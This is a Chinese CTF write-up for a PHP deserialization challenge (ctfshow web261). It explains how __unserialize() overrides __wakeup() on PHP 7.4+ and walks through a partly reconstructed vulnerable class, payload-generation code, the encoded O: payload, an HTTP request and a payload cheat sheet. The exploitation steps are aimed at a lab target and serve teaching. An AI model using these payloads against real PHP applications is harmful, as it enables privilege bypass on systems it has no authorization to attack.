## 一句话概括

题目用 `__wakeup()` 把被改过的属性**重置回安全值**当作防线，但类里同时定义了 **`__unserialize()`** —— 在 **PHP 7.4+** 上，`__unserialize()` 会**顶替** `__wakeup()`，后者**永远不会被调用**。防线因此自动失效，攻击者的属性值原样生效。这是语言机制，不是漏洞编码错误。

## 本题情景与解题手法

> **重要说明**：原笔记 `web261序列化赋值格式以及弱比较加漏洞.md` 的源码**被截断**（只留下 `class ctfShowvip` 的尾部残片，前半段与中间方法丢失，文件名里的「弱比较」部分也没有对应正文）。因此本文的「题目形态」是**按笔记主题与残片还原的结构示意**，不是原文；可靠的只有「`__unserialize` 顶掉 `__wakeup`」这条机制以及 payload 生成方式。

### 题目形态（示意 / 部分还原）

```php
<?php
class ctfShowvip {
    public $isVip = false;          // 默认不是 VIP

    public function __wakeup() {
        // ★ 防线：反序列化时强制改回非 VIP
        $this->isVip = false;
    }

    public function __unserialize($data) {
        // ★ 只要这个方法存在，__wakeup 就永不执行
        $this->isVip = $data['isVip'];
    }

    public function __destruct() {
        if ($this->isVip) {         // ★ 出口：是 VIP 就给 flag
            // ...
        }
    }
}

echo urlencode(serialize(new ctfShowvip()));   // 笔记残片里保留的生成行
?>
```

> 残片里剩下的 `?>';` / `}` / `}` 与最后那句 `echo urlencode(serialize(new ctfShowvip()));` 说明：payload 是**标准 `O:` 格式**（不是 `C:`），由 `serialize()` 直接生成。

### 第一步：看清防线在 `__wakeup`，但它在 7.4+ 上不跑

这是本题的全部关键。PHP 对「反序列化后调用哪个魔术方法」有**优先级**规则：

| PHP 版本 | 反序列化时调用 |
|---|---|
| 7.3 及以前 | `__wakeup()` |
| **7.4+** | **`__unserialize()`**（存在则优先；`__wakeup()` 被跳过） |

规则一句话：**类里只要定义了 `__unserialize()`，`__wakeup()` 就永久让位**（详见 03 / 07 篇）。

所以本题那条「`__wakeup` 里把 `isVip` 改回 false」的防线，在 PHP 7.4+ 上**根本不会执行**：

```text
unserialize($payload)
   → 有 __unserialize() → 调用它（isVip = 攻击者给的值）
   → __wakeup() 被跳过（防线失效）
   → 脚本结束 → __destruct() → isVip 为真 → 拿 flag
```

### 第二步：构造 payload —— 用 `serialize()` 生成

因为 `__unserialize()` 收到的是**属性名 => 属性值**的数组 `$data`，所以 payload 仍是标准的 `O:` 结构（属性名照常写在 `{}` 里），由 PHP 拆好数组再交给 `__unserialize()`：

```php
<?php
class ctfShowvip {
    public $isVip = true;          // ★ 只需要把默认值改掉
}
echo urlencode(serialize(new ctfShowvip()));
// O%3A11%3A%22ctfShowvip%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
?>
```

解码后：

```text
O:11:"ctfShowvip":1:{s:5:"isVip";b:1;}
```

长度核对：类名 `ctfShowvip` = **11**，属性名 `isVip` = **5**，值 `b:1;` 表示 `true`。

### 第三步：提交

payload 里的 `"`、`;`、`{`、`}` 需 URL 编码后放进题目接收 `unserialize()` 的参数（如 `?vip=` 或 cookie，视题目入口而定）：

```http
GET /?vip=O%3A11%3A%22ctfShowvip%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D HTTP/1.1
Host: 靶机地址
```

`__wakeup` 不跑 → `isVip` 保持 `true` → `__destruct` 给出 flag。

### 注入手法一句话总结

> **类里定义了 `__unserialize()`** → PHP 7.4+ 上 `__wakeup()` 被自动跳过 → 「`__wakeup` 重置属性」的防线失效 → 直接用 `serialize()` 生成 `O:11:"ctfShowvip":1:{s:5:"isVip";b:1;}` → `isVip` 为真 → `__destruct` 拿 flag。

## 利用条件

1. **目标 PHP ≥ 7.4**（只有这个版本起 `__unserialize` 才顶替 `__wakeup`；7.3 及以前 `__wakeup` 照常执行，此路不通）；
2. **目标类里同时定义了 `__unserialize()` 和 `__wakeup()`**（否则 `__wakeup` 不会被跳过）；
3. **有可控 `unserialize()`**；
4. **`__unserialize($data)` 直接把 `$data` 的值写进属性**（若它对输入做了校验，还得另想办法）。

## Payload 速查

| 目的 | 写法 |
|---|---|
| 标准 `O:` payload | `O:11:"ctfShowvip":1:{s:5:"isVip";b:1;}` |
| URL 编码后提交 | `?vip=O%3A11%3A%22ctfShowvip%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D` |
| 生成方式 | `echo urlencode(serialize(new ctfShowvip()));`（改好属性） |

## 踩坑与备注

- **这条链的成败全看版本**：PHP 7.4+ 才自动跳过 `__wakeup`。做题先确认目标版本；7.3 及以前请改用 07 / 08 篇的手法（属性个数不匹配、`C:` 形式、引用 `&`）。
- **`__wakeup()` 无参数、`__unserialize($data)` 有参数**：写错签名会直接报致命错误，而不是「魔术方法没被调用」（见 03 / 07 篇）。
- **`__unserialize()` 是 PHP 7.4 引入的新机制**，与更早的 `Serializable::unserialize()`（`C:` 格式）不是一回事：后者需要显式实现接口，前者是语言级自动优先（见 07 篇）。
- **payload 仍是 `O:` 格式**：`__unserialize()` 不改变序列化语法，只是换个方法接收属性数组 —— 不要误以为是 `C:` 格式。
- **`isVip` 若是 `private` / `protected`**，属性名要写成 `\0ctfShowvip\0isVip`（长度 1+11+1+5 = 18），本文按 `public` 示意；以实际题目为准（见 01 篇）。
- **来源残缺提示**：本题笔记**源码被截断**，文件名里的「弱比较」一节**没有任何正文可依**，本文未做臆测。中间的赋值格式细节（如 `$data['x']` 的取值方式）请以实际题目源码为准。
- **靶机地址已抽象**：文中不出现任何真实 UUID / 靶机域名。
